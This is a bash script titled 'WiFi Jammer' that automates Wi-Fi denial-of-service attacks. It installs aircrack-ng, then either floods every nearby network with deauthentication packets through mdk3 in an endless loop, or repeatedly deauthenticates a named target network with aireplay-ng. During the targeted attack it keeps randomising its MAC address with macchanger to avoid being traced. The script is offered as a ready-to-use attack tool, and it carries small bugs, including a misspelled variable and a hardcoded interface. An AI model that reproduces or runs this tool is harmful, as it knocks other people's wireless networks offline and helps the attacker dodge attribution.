#!/bin/bash
#Developed by Akshansh Shrivastava
#https://www.facebook.com/akshansh.shriv
#On 27th April 2017
bold=$(tput bold)
normal=$(tput sgr0)
NONE='\033[00m'
RED='\033[01;31m'
GREEN='\033[01;32m'
YELLOW='\033[01;33m'
PURPLE='\033[01;35m'
CYAN='\033[01;36m'
WHITE='\033[01;37m'
BOLD='\033[1m'
UNDERLINE='\033[4m'
clear
clear
function akwifi {
clear
echo -e "
${RED} _       ___ _______ ${CYAN}       __                     __           
${RED}| |     / (_) ____(_)${CYAN}      / /___ _____ ___  _____/ /____  _____
${RED}| | /| / / / /_  / / ${CYAN} __  / / __  / __ '__ \/ ___/ __/ _ \/ ___/
${RED}| |/ |/ / / __/ / /  ${CYAN}/ /_/ / /_/ / / / / / (__  ) /_/  __/ /    
${RED}|__/|__/_/_/   /_/   ${CYAN}\____/\__,_/_/ /_/ /_/____/\__/\___/_/${NONE}
"
echo -ne "${bold}Hello Mr ${UNDERLINE}${YELLOW}"
whoami 

echo -e "\n${NONE}${CYAN}Better run it as root\n"
 
echo -e "${NONE}What do you want to ${RED}JAM${NONE}:"
echo -e "press '0' to get all required tools ${PURPLE}(Recommend)${NONE}"
echo "press '1' for all wireless devices"
echo "press '2' for a specific known wireless device"
echo -n "Your Choice: "
read opts

function ctrlc {                            #function for trapping CTRL + C 
			service network-manager restart
			echo -n "quitting"
			for i in `seq 1 5`; do
			sleep 0.5
			echo -n "."
			done	
			echo -e "\n"
			exit 1	
			}

if [[ "$opts" = 0 ]]
then
			echo "getting requied tools, Press 'Y' or yes' if prompt"
			apt-get install aircrack-ng && apt-get update
			echo -e "${RED}Press 'B' to go back${NONE}"
			read bck
			if [[ "$bck" = 'b' ]]
			then	
					akwifi
			elif [[ "$bck" = 'B'  ]]
			then
					akwifi
			else
			echo "Sorry Wrong Entry"
			echo "Stopping"
			exit 1;
			fi
elif [[ "$opts" = 1 ]]
then
	echo -n "Enter your wireless interface name: "
	read int
	while true
	do
		trap ctrlpc INT		
		# trap ctrl-c and call ctrl_c()
		function ctrlpc {
		echo "Performing task"
		airmon-ng stop $int"mon"
		service network-manager restart
		echo -n "quitting"
		for i in `seq 1 5`; do
   		sleep 0.5
   		echo -n "."
		done	
		echo -e "\n"
		exit 1	
		}
		airmon-ng start $int
		echo "This may take some while to execute completely"
		echo "Please be patient :)"
	
		echo -e "${YELLOW}Attack has been Started"

		echo -e "${RED}Press Ctrl+C to ${bold}${WHITE}SAFELY${NONE}${RED} Stop the attack anytime${NONE}"
		stty susp ^-
		mdk3 $int"mon" d
	done

elif [[ "$opts" = 2 ]]
then
				echo -n "Enter your wireless interface name: "
				read int
				echo -n "Enter target's name: "
				read nms
				echo -n "Enter channel 0-14: "
				read chnl
	while true
	do
				trap ctrlc INT   	# trap ctrl-c and call ctrl_c()
				ifconfig $int down
				macchanger -r $int | grep "New MAC"
				ifconfig $int up
				sleep 0.3;
                iwconfig $int channel $chnl
                aireplay-ng -0 5 -e "$nms" wlan0
                ifconfig $int down
                macchanger -r $iint | grep "New MAC"
                iwconfig $int mode monitor
                ifconfig $int up
                iwconfig $int | grep "Mode"
                echo Waiting!!!!!!!!!
				stty susp ^-
				echo -e "${RED}Press Ctrl+C anytime to stop the attack${NONE}"
				sleep 3;
	done						
else
	echo -n "Wrong input"
	exit 1
fi
}
akwifi
